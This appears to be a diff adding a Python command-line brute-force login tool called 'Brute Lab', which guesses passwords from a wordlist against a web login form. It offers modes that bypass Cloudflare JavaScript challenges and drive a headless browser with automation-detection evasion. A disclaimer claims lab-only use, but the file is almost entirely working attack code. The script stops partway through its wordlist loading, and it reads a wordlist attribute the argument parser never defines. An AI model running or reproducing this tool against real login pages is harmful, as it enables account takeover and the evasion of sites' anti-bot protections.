@@ -1,0 +1,211 @@
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import cloudscraper
+import time
+import urllib3
+import os
+from bs4 import BeautifulSoup
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from colorama import init, Fore, Back, Style
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Initialize colorama
+init(autoreset=True)
+
+# Default headers
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+CAPTCHA_KEYWORDS = ["captcha", "verify", "recaptcha", "i'm not a robot"]
+
+# Display the header with colors
+def print_header():
+    print(Fore.YELLOW + Style.BRIGHT + """
+    ********************************************
+    *                                          *
+    *    Brute Force Login Tool (CLI)          *
+    *    Author: De Nafman                     *
+    *    For Educational and Ethical Hacking   *
+    *                                          *
+    ********************************************
+
+            Welcome to Brute Lab!
+
+    =====================================================
+    ⚠️  DISCLAIMER: This tool is intended solely for ethical hacking purposes within controlled lab environments only.
+    ⚠️  Make sure you have legal permission to test any system.
+    =====================================================
+
+    Select from the available options to proceed:
+
+    -- `basic` Mode: Uses standard HTTP POST requests for basic login forms.
+    -- `cloudflare` Mode: Uses cloudscraper to bypass Cloudflare's JS challenge.
+    -- `browser` Mode: Automates a real browser using Selenium (headless mode) for full form submission and CAPTCHA bypass.
+
+    Instructions:
+    1. Enter the target URL for the login form.
+    2. Provide the username to brute-force.
+    3. Provide the path to the password file (wordlist).
+    4. Choose your preferred mode of operation (basic, cloudflare, or browser).
+    5. If using browser mode, specify the path to the ChromeDriver.
+
+    Example usage:
+      python Brute_lab.py http://example.com/login user /path/to/wordlist.txt --mode browser --driver /path/to/chromedriver
+    """)
+
+# Pause before proceeding
+def pause_for_user_input():
+    input(Fore.CYAN + "\nPress Enter to continue with the brute force operation...")
+
+# === Auto-detect form fields ===
+def detect_form_fields(url):
+    try:
+        res = requests.get(url, headers=HEADERS, verify=False, timeout=10)
+        soup = BeautifulSoup(res.text, 'html.parser')
+        form = soup.find('form')
+        if not form:
+            print(Fore.RED + "[!] No form detected.")
+            return None, None
+
+        inputs = form.find_all('input')
+        user_field = pass_field = None
+        for input_tag in inputs:
+            input_type = input_tag.get('type', '').lower()
+            name = input_tag.get('name', '').lower()
+            if 'user' in name:
+                user_field = name
+            elif 'pass' in name:
+                pass_field = name
+
+        return user_field, pass_field
+    except Exception as e:
+        print(Fore.RED + f"[!] Error detecting form fields: {e}")
+        return None, None
+
+# === Brute-force Modes ===
+def basic_mode(args, user_field, pass_field):
+    print(Fore.GREEN + "[*] Using BASIC mode (requests)")
+    for i, password in enumerate(args.wordlist, 1):
+        data = {user_field: args.username, pass_field: password}
+        try:
+            res = requests.post(args.url, data=data, headers=HEADERS, verify=False, timeout=10)
+        except requests.RequestException as e:
+            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
+            continue
+
+        print(f"[{i}] Trying: {password}")
+        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
+            print(Fore.YELLOW + "[!] CAPTCHA detected. Skipping.")
+            continue
+        if "incorrect" not in res.text.lower():
+            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
+            return
+        time.sleep(1)
+    print(Fore.RED + "[-] Password not found.")
+
+def cfscrape_mode(args, user_field, pass_field):
+    print(Fore.GREEN + "[*] Using CLOUDFLARE mode (cloudscraper)")
+    scraper = cloudscraper.create_scraper()
+    for i, password in enumerate(args.wordlist, 1):
+        data = {user_field: args.username, pass_field: password}
+        try:
+            res = scraper.post(args.url, data=data, headers=HEADERS, timeout=10)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
+            continue
+
+        print(f"[{i}] Trying: {password}")
+        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
+            print(Fore.YELLOW + "[!] CAPTCHA detected. Skipping.")
+            continue
+        if "incorrect" not in res.text.lower():
+            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
+            return
+        time.sleep(1)
+    print(Fore.RED + "[-] Password not found.")
+
+def selenium_mode(args, user_field, pass_field):
+    print(Fore.GREEN + "[*] Using BROWSER mode (selenium)")
+    chrome_options = Options()
+    chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+
+    try:
+        driver = webdriver.Chrome(executable_path=args.driver, options=chrome_options)
+    except Exception as e:
+        print(Fore.RED + f"[!] Selenium error: {e}")
+        return
+
+    for i, password in enumerate(args.wordlist, 1):
+        try:
+            driver.get(args.url)
+            time.sleep(2)
+            user_input = driver.find_element(By.NAME, user_field)
+            pass_input = driver.find_element(By.NAME, pass_field)
+            submit = driver.find_element(By.XPATH, '//button[@type="submit"]')
+
+            user_input.clear()
+            pass_input.clear()
+            user_input.send_keys(args.username)
+            pass_input.send_keys(password)
+            submit.click()
+
+            time.sleep(2)
+            page_text = driver.page_source.lower()
+            print(f"[{i}] Trying: {password}")
+
+            if any(k in page_text for k in CAPTCHA_KEYWORDS):
+                print(Fore.YELLOW + "[!] CAPTCHA detected. Skipping.")
+                continue
+
+            if "incorrect" not in page_text:
+                print(Fore.GREEN + f"[✅] Password FOUND: {password}")
+                driver.quit()
+                return
+
+        except Exception as e:
+            print(Fore.RED + f"[!] Selenium error on attempt {i}: {e}")
+            continue
+
+    driver.quit()
+    print(Fore.RED + "[-] Password not found.")
+
+# === CLI Entry Point ===
+def main():
+    # Display Header and Instructions
+    print_header()
+
+    # Pause for user to read the instructions
+    pause_for_user_input()
+
+    # Argument parsing and execution
+    parser = argparse.ArgumentParser(
+        description="Brute-force login CLI tool for ethical hacking labs\n\nAuthor: De Nafman",
+        epilog="Usage examples:\n"
+               "  python bruteforce.py http://example.com/login thedanboy7 /path/to/pass.txt\n"
+               "  python bruteforce.py http://example.com/login thedanboy7 /path/to/pass.txt --mode cloudflare\n"
+               "  python bruteforce.py http://example.com/login thedanboy7 /path/to/pass.txt --mode browser --driver /path/to/chromedriver",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    
+    parser.add_argument("url", help="Target login URL (e.g., http://example.com/login)")
+    parser.add_argument("username", help="Username to brute-force (e.g., 'thedanboy7')")
+    parser.add_argument("passwords", help="Path to password file (e.g., /path/to/pass.txt)")
+    parser.add_argument("-m", "--mode", choices=["basic", "cloudflare", "browser"], default="basic", 
+                        help="Select brute-force mode: \n"
+                             "  basic: Uses requests for a basic HTTP login\n"
+                             "  cloudflare: Uses cloudscraper to bypass Cloudflare JS challenges\n"
+                             "  browser: Uses Selenium for full browser automation (with CAPTCHA support)")
+    parser.add_argument("-d", "--driver", default="chromedriver", help="Path to ChromeDriver (required for browser mode)")
+    
+    args = parser.parse_args()
+
+    # Load wordlist
+    if not os.path.exists
